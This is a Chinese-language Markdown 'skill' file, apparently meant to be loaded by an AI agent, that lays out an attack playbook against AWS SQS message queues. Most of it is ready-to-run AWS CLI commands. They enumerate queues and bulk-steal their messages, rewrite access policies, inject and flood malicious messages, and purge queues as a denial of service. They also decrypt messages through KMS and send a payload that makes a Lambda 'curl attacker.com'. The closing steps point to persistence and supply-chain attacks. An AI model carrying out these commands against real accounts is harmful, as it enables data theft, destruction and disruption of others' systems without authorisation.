---
name: aws-sqs-attack
type: attack
category: messaging
platform: aws
severity: medium
---

# AWS SQS 攻击技能

## 触发条件

- 有 AWS 凭证
- 目标使用 SQS
- 用户要求"攻击 SQS"

## 前置检查

```bash
# 1. 验证凭证
aws sts get-caller-identity

# 2. 列出所有队列
aws sqs list-queues

# 3. 获取队列 URL
aws sqs get-queue-url --queue-name QUEUE_NAME
```

## 攻击方法

### 方法 1: 队列枚举

```bash
# 1. 列出所有队列
aws sqs list-queues --query 'QueueUrls[]' --output text

# 2. 获取队列属性
aws sqs get-queue-attributes --queue-url QUEUE_URL --attribute-names All

# 3. 搜索敏感队列
aws sqs list-queues | grep -i -E "password|secret|sensitive|private|credential"
```

### 方法 2: 消息窃取

```bash
# 1. 接收消息
aws sqs receive-message --queue-url QUEUE_URL

# 2. 接收多条消息
aws sqs receive-message \
  --queue-url QUEUE_URL \
  --max-number-of-messages 10 \
  --wait-time-seconds 1

# 3. 读取消息内容（不删除）
aws sqs receive-message --queue-url QUEUE_URL --query 'Messages[].Body' --output text

# 4. 批量窃取所有消息
while true; do
  MESSAGES=$(aws sqs receive-message --queue-url QUEUE_URL --max-number-of-messages 10)
  if [ -z "$MESSAGES" ]; then break; fi
  echo "$MESSAGES" >> /tmp/sqs-messages.txt
done
```

### 方法 3: 队列属性利用

```bash
# 1. 获取队列策略
aws sqs get-queue-attributes --queue-url QUEUE_URL --attribute-names Policy

# 2. 检查跨账户访问
aws sqs get-queue-attributes --queue-url QUEUE_URL --attribute-names Policy | \
  jq -r '.Attributes.Policy | fromjson? | .Statement[]? | select(.Principal=="*")'

# 3. 添加自己到策略（如果有权限）
aws sqs set-queue-attributes \
  --queue-url QUEUE_URL \
  --attributes file://policy.json

# 4. 修改队列可见性超时（锁定消息）
aws sqs set-queue-attributes \
  --queue-url QUEUE_URL \
  --attributes VisibilityTimeout=43200
```

### 方法 4: 死信队列利用

```bash
# 1. 检查死信队列配置
aws sqs get-queue-attributes --queue-url QUEUE_URL --attribute-names RedrivePolicy

# 2. 获取死信队列 URL
DLQ_URL=$(aws sqs get-queue-attributes --queue-url QUEUE_URL \
  --attribute-names RedrivePolicy | \
  jq -r '.Attributes.RedrivePolicy | fromjson | .deadLetterTargetArn' | \
  awk -F: '{print "https://"substr($0,1,length($0)-4)".amazonaws.com/"$6}')

# 3. 从死信队列读取失败的消息
aws sqs receive-message --queue-url $DLQ_URL

# 4. 分析失败原因（可能包含敏感错误信息）
```

### 方法 5: 消息注入和篡改

```bash
# 1. 发送恶意消息
aws sqs send-message \
  --queue-url QUEUE_URL \
  --message-body "malicious_payload"

# 2. 发送 JSON 消息
aws sqs send-message \
  --queue-url QUEUE_URL \
  --message-body '{"cmd": "inject", "data": "malicious"}' \
  --message-attributes Name1={StringValue=value1,DataType=String}

# 3. 批量发送（消息洪泛）
for i in {1..1000}; do
  aws sqs send-message --queue-url QUEUE_URL --message-body "spam_$i"
done

# 4. 延迟消息（定时攻击）
aws sqs send-message \
  --queue-url QUEUE_URL \
  --message-body "delayed_attack" \
  --delay-seconds 300
```

### 方法 6: 队列清空和 DoS

```bash
# 1. 清空队列（删除所有消息）
while true; do
  RECEIPT=$(aws sqs receive-message --queue-url QUEUE_URL --query 'Messages[0].ReceiptHandle' --output text)
  if [ -z "$RECEIPT" ]; then break; fi
  aws sqs delete-message --queue-url QUEUE_URL --receipt-handle $RECEIPT
done

# 2. 或使用 Purge（一次性清空）
aws sqs purge-queue --queue-url QUEUE_URL

# 3. 修改队列长度限制
aws sqs set-queue-attributes \
  --queue-url QUEUE_URL \
  --attributes RedrivePolicy='{"deadLetterTargetArn":"DLQ_ARN","maxReceiveCount":"1"}'
```

### 方法 7: 加密利用

```bash
# 1. 检查是否启用加密
aws sqs get-queue-attributes --queue-url QUEUE_URL --attribute-names KmsMasterKeyId

# 2. 获取 KMS Key ID
KEY_ID=$(aws sqs get-queue-attributes --queue-url QUEUE_URL --attribute-names KmsMasterKeyId | \
  jq -r '.Attributes.KmsMasterKeyId')

# 3. 如果有 KMS 权限，解密消息
aws kms decrypt --ciphertext-blob fileb://encrypted_message.bin --output text

# 4. 或重新加密（修改消息）
aws kms encrypt --key-id $KEY_ID --plaintext "malicious_message" --output text
```

### 方法 8: 服务器端加密利用

```bash
# 1. 检查 SSE 配置
aws sqs get-queue-attributes --queue-url QUEUE_URL --attribute-names SqsManagedSseEnabled

# 2. 如果未启用加密
# 可以窃取明文消息

# 3. 如果启用加密但可以访问 KMS
# 尝试解密消息
```

### 方法 9: 访问日志利用

```bash
# 1. 检查是否启用访问日志
aws sqs get-queue-attributes --queue-url QUEUE_URL --attribute-names All | \
  jq -r '.Attributes | keys[]' | grep -i log

# 2. 如果有 CloudWatch 日志
# 访问日志包含消息内容
aws logs get-log-events \
  --log-group-name /aws/sqs/QUEUE_NAME \
  --log-stream-name LOG_STREAM_NAME

# 3. 搜索敏感信息
aws logs filter-log-events \
  --log-group-name /aws/sqs/QUEUE_NAME \
  --filter-pattern "password|secret|token"
```

### 方法 10: Lambda/SNS 触发利用

```bash
# 1. 检查 Lambda 事件源映射
aws lambda list-event-source-mappings --event-source-arn QUEUE_ARN

# 2. 如果有 Lambda 监听队列
# 消息会触发 Lambda

# 3. 发送恶意消息触发 Lambda
# 利用 Lambda 注入或 SSRF
aws sqs send-message \
  --queue-url QUEUE_URL \
  --message-body '{"cmd": "curl attacker.com", "delay": 0}'

# 4. 检查 SNS 订阅
aws sns list-subscriptions-by-topic --topic-arn TOPIC_ARN
```

## 验证成功

```bash
# 成功列出队列
aws sqs list-queues

# 成功接收消息
aws sqs receive-message --queue-url QUEUE_URL

# 成功发送消息
aws sqs send-message --queue-url QUEUE_URL --message-body "test"
```

## 下一步

1. 分析窃取的消息内容
2. 通过 SQS 建立持久化通信
3. 攻击监听的 Lambda 函数
4. 利用消息队列进行供应链攻击
